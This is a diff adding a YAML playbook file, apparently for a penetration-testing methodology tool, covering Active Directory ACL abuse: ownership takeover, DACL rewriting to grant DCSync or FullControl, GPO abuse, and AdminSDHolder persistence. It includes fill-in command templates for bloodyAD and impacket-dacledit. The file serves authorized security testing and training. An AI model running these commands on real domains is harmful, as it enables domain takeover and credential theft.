@@ -1,0 +1,128 @@
+# Cephalo content — AD ACL abuse leftovers (AD-7): WriteOwner / WriteDACL / GPO / AdminSDHolder.
+# Authorized testing only. These weaponize the BloodHound WriteOwner/WriteDacl/GPLink edges.
+sections:
+  - id: ad.p10.acl2
+    title: AD ACL Abuse (ownership, DACL, GPO)
+    os: ad
+    phase: lateral-movement
+    order: 126
+    description: Take ownership, rewrite DACLs, abuse GPO links, and AdminSDHolder persistence.
+    techniques: [ad.acl.writeowner, ad.acl.writedacl, ad.acl.gpo, ad.acl.adminsdholder]
+    packs: [oscp]
+
+techniques:
+  - id: ad.acl.writeowner
+    title: WriteOwner → take ownership
+    os: [ad]
+    phase: lateral-movement
+    summary: Set yourself as owner of the target object, then grant yourself rights.
+    body: |
+      A WriteOwner edge lets you make yourself the object's owner; the owner can
+      always write the DACL, so chain WriteOwner → WriteDACL → full control.
+    commands: [ad.acl.writeowner.bloodyad]
+    tags: [acl-abuse, lateral-movement]
+    archetypeBand: high
+    references: [ref.bloodyad, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.acl.writedacl]
+
+  - id: ad.acl.writedacl
+    title: WriteDACL → grant rights
+    os: [ad]
+    phase: lateral-movement
+    summary: Write a new ACE granting yourself control (e.g. DCSync on the domain).
+    body: |
+      With WriteDACL over the domain object you can grant yourself the replication
+      rights needed for DCSync; over a user, grant GenericAll to reset/roast them.
+    commands: [ad.acl.writedacl.dacledit]
+    tags: [acl-abuse, lateral-movement, dcsync]
+    archetypeBand: high
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.credaccess.dcsync]
+
+  - id: ad.acl.gpo
+    title: GPO abuse (methodology)
+    os: [ad]
+    phase: lateral-movement
+    summary: Edit a GPO you control to run code on linked computers/users.
+    body: |
+      With write rights over a GPO (or its link), you can push an immediate scheduled
+      task or startup script to every object in scope. Exact tooling and link scope
+      are environment-specific — confirm the GPO's links before acting.
+    commands: [ad.acl.gpo.abuse]
+    tags: [acl-abuse, lateral-movement]
+    archetypeBand: medium
+    references: [ref.hacktricks, ref.adsecurity]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.acl.adminsdholder
+    title: AdminSDHolder persistence
+    os: [ad]
+    phase: persistence
+    summary: Write a DACL on AdminSDHolder; SDProp re-applies it to protected groups.
+    body: |
+      The AdminSDHolder object's DACL is stamped onto protected groups (Domain Admins
+      etc.) by SDProp on a timer. Granting yourself rights there is durable domain
+      persistence — methodology only.
+    commands: [ad.acl.adminsdholder.note]
+    tags: [acl-abuse, persistence]
+    archetypeBand: medium
+    references: [ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: ad.acl.writeowner.bloodyad
+    title: Set owner (bloodyAD)
+    template: "bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u '{{USER}}' -p '{{PASS}}' set owner '{{TARGET_USER}}' '{{USER}}'"
+    tool: bloodyAD
+    description: Make yourself the owner of the target object.
+    os: [ad]
+    phase: lateral-movement
+    tags: [acl-abuse]
+    confidence: verified
+    references: [ref.bloodyad]
+    danger: high
+    packs: [oscp]
+  - id: ad.acl.writedacl.dacledit
+    title: Write a DACL ACE (impacket-dacledit)
+    template: "impacket-dacledit -action write -rights FullControl -principal '{{USER}}' -target '{{TARGET_USER}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -dc-ip {{DC_IP}}"
+    tool: impacket
+    description: Grant a principal FullControl (or DCSync) over the target.
+    os: [ad]
+    phase: lateral-movement
+    tags: [acl-abuse]
+    notes:
+      - "Use -rights DCSync -target-dn 'DC=corp,DC=local' to grant replication rights on the domain."
+    confidence: verified
+    references: [ref.impacket]
+    danger: critical
+    packs: [oscp]
+  - id: ad.acl.gpo.abuse
+    title: GPO immediate task (pointer)
+    template: "# push an immediate scheduled task via a GPO you can edit — confirm its link scope first"
+    shell: text
+    description: Edit a writable GPO to execute on linked objects (tooling is version-specific).
+    os: [ad]
+    phase: lateral-movement
+    tags: [acl-abuse]
+    confidence: unverified
+    references: [ref.hacktricks]
+    danger: high
+    packs: [oscp]
+  - id: ad.acl.adminsdholder.note
+    title: AdminSDHolder DACL (pointer)
+    template: "# grant rights on CN=AdminSDHolder,CN=System; SDProp re-stamps protected groups on its timer"
+    shell: text
+    description: Durable persistence via the AdminSDHolder template DACL.
+    os: [ad]
+    phase: persistence
+    tags: [acl-abuse, persistence]
+    confidence: verified
+    references: [ref.adsecurity]
+    danger: critical
+    packs: [oscp]
